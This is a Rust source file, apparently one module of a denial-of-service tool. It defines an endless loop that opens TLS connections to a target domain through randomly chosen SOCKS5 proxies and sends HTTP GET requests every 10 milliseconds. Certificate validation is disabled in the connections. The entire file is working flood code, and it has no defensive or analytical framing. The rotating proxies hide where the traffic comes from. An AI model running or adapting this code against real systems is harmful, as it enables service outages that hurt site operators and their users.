// src/flood/tls.rs
use tokio::io::AsyncWriteExt;
use native_tls::TlsConnector as NativeTls;
use tokio_native_tls::TlsConnector;
use tokio::time::{sleep, Duration};
use crate::utils::get_random_proxy;
use socks::Socks5Stream;

pub async fn start_tls_flood(domain: &str, port: u16, proxies: Vec<String>) {
    let connector = TlsConnector::from(
        NativeTls::builder()
            .danger_accept_invalid_certs(true)
            .build()
            .unwrap()
    );

    loop {
        if let Some(proxy) = get_random_proxy(&proxies) {
            if let Ok(socks_stream) = Socks5Stream::connect(proxy.clone(), (domain, port)) {
                let std_stream = socks_stream.into_inner();
                if let Ok(tokio_stream) = tokio::net::TcpStream::from_std(std_stream) {
                    match connector.connect(domain, tokio_stream).await {
                        Ok(mut tls_stream) => {
                            let _ = tls_stream.write_all(b"GET / HTTP/1.1\r\nHost: host\r\n\r\n").await;
                            println!("[TLS] Sent via {}", proxy);
                        }
                        Err(e) => eprintln!("[TLS] TLS error: {}", e),
                    }
                }
            }
        }
        sleep(Duration::from_millis(10)).await;
    }
}